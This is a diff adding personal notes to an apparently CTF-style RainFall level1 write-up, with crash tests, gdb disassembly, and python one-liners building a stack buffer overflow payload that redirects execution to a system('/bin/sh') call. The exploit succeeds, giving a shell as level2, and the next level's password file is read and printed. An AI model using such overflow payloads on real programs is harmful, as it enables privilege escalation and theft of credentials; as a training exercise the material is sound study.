@@ -45,6 +45,9 @@ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
 level1@RainFall:~$ ./level1
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabc
 Illegal instruction (core dumped)
+level1@RainFall:~$ ./level1
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcd
+Segmentation fault (core dumped)
 
 
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbash ? -> overflow to function call
@@ -58,6 +61,26 @@ void run(void)
   system("/bin/sh");
   return;
 }
+
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:	mov    %eax,(%esp)
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave  
+   0x0804847f <+59>:	ret    
+End of assembler dump.
+
 
                              **************************************************************
                              *                          FUNCTION                          *
@@ -74,5 +97,98 @@ void run(void)
 
 Stack[-0x10] -> a 16 bits de return value
 
+
 main : 0x08048444
 run : 0x08048480	
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab
+0x08048480
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08
+
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08
+
+
+level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/payload
+level1@RainFall:~$ cat /tmp/payload 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD�
+level1@RainFall:~$ gdb ./level1 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
+(gdb) r < $(cat /tmp/payload)
+Starting program: /home/user/level1/level1 < $(cat /tmp/payload)
+/bin/bash: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD: No such file or directory
+During startup program exited with code 1.
+(gdb) r < /tmp/payload
+Starting program: /home/user/level1/level1 < /tmp/payload
+Good... Wait what?
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+
+
+
+system call : 0x08048479
+
+python -c "print 'A' * 76 + '\x79\x47\x04\x08'" > /tmp/payload
+
+level1@RainFall:~$ python -c "print 'A' * 76 + '\x79\x47\x04\x08'" > /tmp/payload
+level1@RainFall:~$ cat /tmp/
+cat: /tmp/: Is a directory
+level1@RainFall:~$ cat /tmp/payload 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAyG
+level1@RainFall:~$ gdb ./level1 
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
+(gdb) r < /tmp/payload 
+Starting program: /home/user/level1/level1 < /tmp/payload
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08044779 in ?? ()
+
+
+
+0x08048472 <+46>:	movl   $0x8048584,(%esp)
+python -c "print 'A' * 76 + '\x72\x84\x04\x08'" > /tmp/payload
+
+
+level1@RainFall:~$ cat /tmp/payload - | ./level1 
+Good... Wait what?
+id
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+ls
+ls: cannot open directory .: Permission denied
+ls
+ls: cannot open directory .: Permission denied
+ls
+ls: cannot open directory .: Permission denied
+pwd
+/home/user/level1
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+exit
+Segmentation fault (core dumped)
+level1@RainFall:~$ 
+
+cat ... - >>> pour faire interagir avec le sh command qui est sans -i donc pas interactif alors qu'il est dans un process pipe.
+- premet a cat de prendre l'entree standard.
